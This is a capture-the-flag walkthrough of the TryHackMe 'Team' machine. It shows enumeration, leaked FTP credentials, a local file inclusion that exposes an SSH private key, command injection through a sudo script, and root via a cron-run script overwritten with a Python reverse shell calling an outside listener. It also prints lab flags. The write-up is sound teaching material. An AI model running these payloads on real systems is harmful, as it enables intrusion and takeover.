# Team

Beginner friendly boot2root machine

# Initial Foothold

## Services

Let's add the domain to our `hosts` file:

~~~
$ echo "10.10.246.106 team.thm" | sudo tee -a /etc/hosts
~~~

Nmap reveals 3 services running on their standard ports:

~~~
$ nmap -sC -sV -A 10.10.246.106
Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-23 13:43 CEST
Nmap scan report for 10.10.246.106
Host is up (0.065s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 79:5f:11:6a:85:c2:08:24:30:6c:d4:88:74:1b:79:4d (RSA)
|   256 af:7e:3f:7e:b4:86:58:83:f1:f6:a2:54:a6:9b:ba:ad (ECDSA)
|_  256 26:25:b0:7b:dc:3f:b2:94:37:12:5d:cd:06:98:c7:9f (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te...
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## FTP

The FTP service doesn't allow anonymous access.

~~~
kali@kali:/data/vpn$ ftp 10.10.246.106
Connected to 10.10.246.106.
220 (vsFTPd 3.0.3)
Name (10.10.246.106:kali): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> 
~~~

# Web

## Robots.txt

The web server seems to show only the Apache welcome page. There is a `robots.txt` file, but it only provides a string which may be a username.

~~~
kali@kali:/data/Team/files$ curl -s http://team.thm/robots.txt
dale
~~~

## Web Enumeration

Enumerating the directories at the root of the web server with `gobuster` reveals the presence of a `/scripts` directory:

~~~
kali@kali:/data/Team/files$ gobuster dir -u http://www.team.thm -x php,txt -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://www.team.thm
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Timeout:        10s
===============================================================
2021/04/25 13:08:59 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.php (Status: 403)
/.hta.txt (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/assets (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/robots.txt (Status: 200)
/robots.txt (Status: 200)
/scripts (Status: 301)
/server-status (Status: 403)
===============================================================
2021/04/25 13:10:28 Finished
===============================================================
~~~

Further enumerating the `/scripts` directory reveals the presence of `script.txt`:

~~~
kali@kali:/data/vpn$ gobuster dir -u http://www.team.thm/scripts/ -x php,txt -w /usr/share/wordlists/dirb/common.txt ===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://www.team.thm/scripts/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Timeout:        10s
===============================================================
2021/04/23 15:24:49 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.php (Status: 403)
/.hta.txt (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/script.txt (Status: 200)
===============================================================
2021/04/23 15:26:06 Finished
===============================================================
~~~

However, this file is only a hint to find another file:

~~~
kali@kali:/usr/share/wordlists/dirbuster$ curl -s http://www.team.thm/scripts/script.txt
#!/bin/bash
read -p "Enter Username: " REDACTED
read -sp "Enter Username Password: " REDACTED
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit

# Updated version of the script
# Note to self had to change the extension of the old "script" in this folder, as it has creds in
~~~

The backup file is much more interesting as it contains credentials:

~~~
kali@kali:/usr/share/wordlists/dirbuster$ curl -s http://www.team.thm/scripts/script.old
#!/bin/bash
read -p "Enter Username: " ftpuser
read -sp "Enter Username Password: " T3@m$h@r3
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit
~~~

# FTP access

Now with valid credentials (`ftpuser:T3@m$h@r3`), we can connect against the FTP service:

~~~
kali@kali:/usr/share/wordlists/dirbuster$ ftp team.thm
Connected to team.thm.
220 (vsFTPd 3.0.3)
Name (team.thm:kali): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxr-x    2 65534    65534        4096 Jan 15 21:25 workshare
226 Directory send OK.
ftp> cd workshare
250 Directory successfully changed.
~~~

There is an interesting file that tells us 2 important things:

* there might be a dev website
* there is probably a SSH key somewhere in a configuration file

~~~
ftp> ls -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxr-x    2 65534    65534        4096 Jan 15 21:25 .
drwxr-xr-x    5 65534    65534        4096 Jan 15 21:25 ..
-rwxr-xr-x    1 1002     1002          269 Jan 15 21:24 New_site.txt
226 Directory send OK.
ftp> get New_site.txt -
remote: New_site.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for New_site.txt (269 bytes).
Dale
	I have started coding a new website in PHP for the team to use, this is currently under development. It can be
found at ".dev" within our domain.

Also as per the team policy please make a copy of your "id_rsa" and place this in the relevent config file.

Gyles 
226 Transfer complete.
269 bytes received in 0.00 secs (101.9780 kB/s)
~~~

# Domain enumeration

Let's use `wfuzz` to find a potential dev subdomain:

~~~
kali@kali:/data/vpn$ wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://team.thm" -H "Host: FUZZ.team.thm" --hw 977

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://team.thm/
Total requests: 4997

===================================================================
ID           Response   Lines    Word     Chars       Payload                                             
===================================================================

000000001:   200        89 L     220 W    2966 Ch     "www" 
000000019:   200        9 L      20 W     187 Ch      "dev"
000000085:   200        9 L      20 W     187 Ch      "www.dev"
000000690:   400        12 L     53 W     422 Ch      "gc._msdcs"
000001176:   200        89 L     220 W    2966 Ch     "WWW"

Total time: 71.40179
Processed Requests: 4997
Filtered Requests: 4992
Requests/sec.: 69.98423
~~~

The domain actually hosts a subdomain for dev, let's add it to our `hosts` file:

~~~
$ echo "10.10.246.106 dev.team.thm" | sudo tee -a /etc/hosts
~~~

# The "dev" subdomain

Connecting to the dev subdomain reveals an interesting `script.php` page:

~~~
kali@kali:/data/Team/files$ curl -s http://dev.team.thm
<html>
 <head>
  <title>UNDER DEVELOPMENT</title>
 </head>
 <body>
  Site is being built<a href=script.php?page=teamshare.php </a>
<p>Place holder link to team share</p>
 </body>
</html>
~~~

This page is vulnerable to Local File Inclusion (LFI):

~~~
kali@kali:/data$ curl -s http://dev.team.thm/script.php?page=../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
dale:x:1000:1000:anon,,,:/home/dale:/bin/bash
gyles:x:1001:1001::/home/gyles:/bin/bash
ftpuser:x:1002:1002::/home/ftpuser:/bin/sh
ftp:x:110:116:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
~~~

After a few unsuccessful attempts to read the SSH key in the home folder, I decided to run the discovery using a dictionnary of paths.

~~~
kali@kali:/usr/share/wordlists/SecLists/Fuzzing/LFI$ wfuzz -c -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://dev.team.thm/script.php?page=FUZZ --hw=0

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://dev.team.thm/script.php?page=FUZZ
Total requests: 257

===================================================================
ID           Response   Lines    Word     Chars       Payload                                             
===================================================================

000000001:   200        34 L     42 W     1698 Ch     "/etc/passwd"                                       
000000005:   200        230 L    1119 W   7313 Ch     "/etc/apache2/apache2.conf"                         
000000015:   200        15 L     123 W    721 Ch      "/etc/crontab"                                      
000000018:   200        10 L     68 W     424 Ch      "/etc/fstab"                                        
000000024:   200        8 L      22 W     185 Ch      "/etc/hosts"                                        
000000025:   200        11 L     57 W     412 Ch      "/etc/hosts.allow"                                  
000000026:   200        18 L     111 W    712 Ch      "/etc/hosts.deny"                                   
000000038:   200        3 L      5 W      25 Ch       "/etc/issue"                                        
000000044:   200        5 L      6 W      104 Ch      "/etc/lsb-release"                                  
000000048:   200        34 L     198 W    2455 Ch     "/etc/mtab"                                         
000000052:   200        5 L      16 W     91 Ch       "/etc/network/interfaces"                           
000000053:   200        3 L      12 W     92 Ch       "/etc/networks"                                     
000000055:   200        34 L     42 W     1698 Ch     "/etc/passwd"                                       
000000070:   200        28 L     97 W     582 Ch      "/etc/profile"                                      
000000080:   200        19 L     113 W    736 Ch      "/etc/resolv.conf"                                  
000000084:   200        169 L    447 W    5990 Ch     "/etc/ssh/sshd_config"                              
000000083:   200        52 L     218 W    1581 Ch     "/etc/ssh/ssh_config"                               
000000094:   200        160 L    955 W    5937 Ch     "/etc/vsftpd.conf"                                  
000000104:   200        28 L     164 W    901 Ch      "/proc/cpuinfo"                                     
000000105:   200        35 L     61 W     405 Ch      "/proc/filesystems"                                 
000000106:   200        41 L     188 W    1774 Ch     "/proc/interrupts"                                  
000000107:   200        42 L     139 W    1007 Ch     "/proc/ioports"                                     
000000108:   200        48 L     137 W    1308 Ch     "/proc/meminfo"                                     
000000109:   200        83 L     492 W    4650 Ch     "/proc/modules"                                     
000000110:   200        34 L     198 W    2455 Ch     "/proc/mounts"                                      
000000111:   200        10 L     998 W    2136 Ch     "/proc/stat"                                        
000000112:   200        3 L      10 W     102 Ch      "/proc/swaps"                                       
000000113:   200        2 L      17 W     147 Ch      "/proc/version"                                     
000000114:   200        3 L      15 W     157 Ch      "/proc/self/net/arp"                                
000000188:   200        1 L      1 W      32097 Ch    "/var/log/faillog"                                  
000000224:   200        2 L      4 W      1537 Ch     "/var/run/utmp"                                     
000000220:   200        13 L     106 W    62955 Ch    "/var/log/wtmp"                                     
000000181:   200        5332 L   31922    364050 Ch   "/var/log/dpkg.log"                                 
                                 W                                                                        
000000199:   200        5 L      18 W     292866 Ch   "/var/log/lastlog"                                  

Total time: 2.415347
Processed Requests: 257
Filtered Requests: 223
Requests/sec.: 106.4029
~~~

It seemed that `sshd_config` could be a good candidate, which was confirmed:

~~~
kali@kali:/usr/share/wordlists/SecLists/Fuzzing/LFI$ curl -s http://dev.team.thm/script.php?page=/etc/ssh/sshd_config 

[REDACTED]

#Dale id_rsa
#-----BEGIN OPENSSH PRIVATE KEY-----
#b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
#NhAAAAAwEAAQAAAYEAng6KMTH3zm+6rqeQzn5HLBjgruB9k2rX/XdzCr6jvdFLJ+uH4ZVE
#NUkbi5WUOdR4ock4dFjk03X1bDshaisAFRJJkgUq1+zNJ+p96ZIEKtm93aYy3+YggliN/W
#oG+RPqP8P6/uflU0ftxkHE54H1Ll03HbN+0H4JM/InXvuz4U9Df09m99JYi6DVw5XGsaWK
#o9WqHhL5XS8lYu/fy5VAYOfJ0pyTh8IdhFUuAzfuC+fj0BcQ6ePFhxEF6WaNCSpK2v+qxP
#zMUILQdztr8WhURTxuaOQOIxQ2xJ+zWDKMiynzJ/lzwmI4EiOKj1/nh/w7I8rk6jBjaqAu
#k5xumOxPnyWAGiM0XOBSfgaU+eADcaGfwSF1a0gI8G/TtJfbcW33gnwZBVhc30uLG8JoKS
#xtA1J4yRazjEqK8hU8FUvowsGGls+trkxBYgceWwJFUudYjBq2NbX2glKz52vqFZdbAa1S
#0soiabHiuwd+3N/ygsSuDhOhKIg4MWH6VeJcSMIrAAAFkNt4pcTbeKXEAAAAB3NzaC1yc2
#EAAAGBAJ4OijEx985vuq6nkM5+RywY4K7gfZNq1/13cwq+o73RSyfrh+GVRDVJG4uVlDnU
#eKHJOHRY5NN19Ww7IWorABUSSZIFKtfszSfqfemSBCrZvd2mMt/mIIJYjf1qBvkT6j/D+v
#7n5VNH7cZBxOeB9S5dNx2zftB+CTPyJ177s+FPQ39PZvfSWIug1cOVxrGliqPVqh4S+V0v
#JWLv38uVQGDnydKck4fCHYRVLgM37gvn49AXEOnjxYcRBelmjQkqStr/qsT8zFCC0Hc7a/
#FoVEU8bmjkDiMUNsSfs1gyjIsp8yf5c8JiOBIjio9f54f8OyPK5OowY2qgLpOcbpjsT58l
#gBojNFzgUn4GlPngA3Ghn8EhdWtICPBv07SX23Ft94J8GQVYXN9LixvCaCksbQNSeMkWs4
#xKivIVPBVL6MLBhpbPra5MQWIHHlsCRVLnWIwatjW19oJSs+dr6hWXWwGtUtLKImmx4rsH
#ftzf8oLErg4ToSiIODFh+lXiXEjCKwAAAAMBAAEAAAGAGQ9nG8u3ZbTTXZPV4tekwzoijb
#esUW5UVqzUwbReU99WUjsG7V50VRqFUolh2hV1FvnHiLL7fQer5QAvGR0+QxkGLy/AjkHO
#eXC1jA4JuR2S/Ay47kUXjHMr+C0Sc/WTY47YQghUlPLHoXKWHLq/PB2tenkWN0p0fRb85R
#N1ftjJc+sMAWkJfwH+QqeBvHLp23YqJeCORxcNj3VG/4lnjrXRiyImRhUiBvRWek4o4Rxg
#Q4MUvHDPxc2OKWaIIBbjTbErxACPU3fJSy4MfJ69dwpvePtieFsFQEoJopkEMn1Gkf1Hyi
#U2lCuU7CZtIIjKLh90AT5eMVAntnGlK4H5UO1Vz9Z27ZsOy1Rt5svnhU6X6Pldn6iPgGBW
#/vS5rOqadSFUnoBrE+Cnul2cyLWyKnV+FQHD6YnAU2SXa8dDDlp204qGAJZrOKukXGIdiz
#82aDTaCV/RkdZ2YCb53IWyRw27EniWdO6NvMXG8pZQKwUI2B7wljdgm3ZB6fYNFUv5AAAA
#wQC5Tzei2ZXPj5yN7EgrQk16vUivWP9p6S8KUxHVBvqdJDoQqr8IiPovs9EohFRA3M3h0q
#z+zdN4wIKHMdAg0yaJUUj9WqSwj9ItqNtDxkXpXkfSSgXrfaLz3yXPZTTdvpah+WP5S8u6
#RuSnARrKjgkXT6bKyfGeIVnIpHjUf5/rrnb/QqHyE+AnWGDNQY9HH36gTyMEJZGV/zeBB7
#/ocepv6U5HWlqFB+SCcuhCfkegFif8M7O39K1UUkN6PWb4/IoAAADBAMuCxRbJE9A7sxzx
#sQD/wqj5cQx+HJ82QXZBtwO9cTtxrL1g10DGDK01H+pmWDkuSTcKGOXeU8AzMoM9Jj0ODb
#mPZgp7FnSJDPbeX6an/WzWWibc5DGCmM5VTIkrWdXuuyanEw8CMHUZCMYsltfbzeexKiur
#4fu7GSqPx30NEVfArs2LEqW5Bs/bc/rbZ0UI7/ccfVvHV3qtuNv3ypX4BuQXCkMuDJoBfg
#e9VbKXg7fLF28FxaYlXn25WmXpBHPPdwAAAMEAxtKShv88h0vmaeY0xpgqMN9rjPXvDs5S
#2BRGRg22JACuTYdMFONgWo4on+ptEFPtLA3Ik0DnPqf9KGinc+j6jSYvBdHhvjZleOMMIH
#8kUREDVyzgbpzIlJ5yyawaSjayM+BpYCAuIdI9FHyWAlersYc6ZofLGjbBc3Ay1IoPuOqX
#b1wrZt/BTpIg+d+Fc5/W/k7/9abnt3OBQBf08EwDHcJhSo+4J4TFGIJdMFydxFFr7AyVY7
#CPFMeoYeUdghftAAAAE3A0aW50LXA0cnJvdEBwYXJyb3QBAgMEBQYH
#-----END OPENSSH PRIVATE KEY-----
~~~

# SSH access / User flag

Let's save the SSH key and connect to get the user flag:

~~~
$ curl -s http://dev.team.thm/script.php?page=/etc/ssh/sshd_config | tail -n 39 | sed -s "s/#//g" > /data/ssh.key
$ chmod 600 ssh.key 
$ ssh -i ssh.key dale@team.thm
Last login: Mon Jan 18 10:51:32 2021
dale@TEAM:~$ 
dale@TEAM:~$ cat user.txt 
THM{6Y0TXHz7c2d}
~~~

# Lateral move (dale -> gyles)

Checking the user privileges reveals that we can runa script as `gyles` using `sudo`:

~~~
dale@TEAM:~$ sudo -l
Matching Defaults entries for dale on TEAM:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dale may run the following commands on TEAM:
    (gyles) NOPASSWD: /home/gyles/admin_checks
~~~

The script is as follows:

~~~
dale@TEAM:/home/gyles$ cat admin_checks 
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
~~~

Injecting `/bin/bash -i` in the date field will spawn a shell as `gyles`:

~~~
dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: gyles
Enter 'date' to timestamp the file: /bin/bash -i
The Date is uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)
python3 -c "import pty;pty.spawn('/bin/bash')"
gyles@TEAM:~$ id
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)
gyles@TEAM:~$ 
~~~

Now, add your `~/.ssh/id_rsa.pub` key to `/home/gyles/.ssh/authorized_keys` to connect directly as `gyles`.

# Privilege Escalation / Root flag

Running `pspy64` will reveal the following cron job executed by `root`:

~~~
2021/04/25 11:21:01 CMD: UID=0    PID=21433  | /bin/bash /opt/admin_stuff/script.sh 
~~~

The script itself is not writable for us, but calls 2 other scripts:

~~~
gyles@TEAM:/tmp$ ls -l /opt/admin_stuff/script.sh 
-rwxr--r-- 1 root root 200 Jan 17 20:38 /opt/admin_stuff/script.sh
gyles@TEAM:/tmp$ cat /opt/admin_stuff/script.sh 
#!/bin/bash
#I have set a cronjob to run this script every minute


dev_site="/usr/local/sbin/dev_backup.sh"
main_site="/usr/local/bin/main_backup.sh"
#Back ups the sites locally
$main_site
$dev_site
~~~

...one of which being writable. Let's replace its content with a reverse shell:

~~~
gyles@TEAM:~$ cat /usr/local/bin/main_backup.sh
#!/bin/bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.50.72",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
~~~

After some time, we get a root shell, which allows to read the root flag:

~~~
kali@kali:~$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...

connect to [10.8.50.72] from (UNKNOWN) [10.10.156.169] 44966
bash: cannot set terminal process group (1201): Inappropriate ioctl for device
bash: no job control in this shell
root@TEAM:~# 
root@TEAM:~# id
id
uid=0(root) gid=0(root) groups=0(root),1004(admin)
root@TEAM:~# cat /root/root.txt
cat /root/root.txt
THM{fhqbznavfonq}
~~~
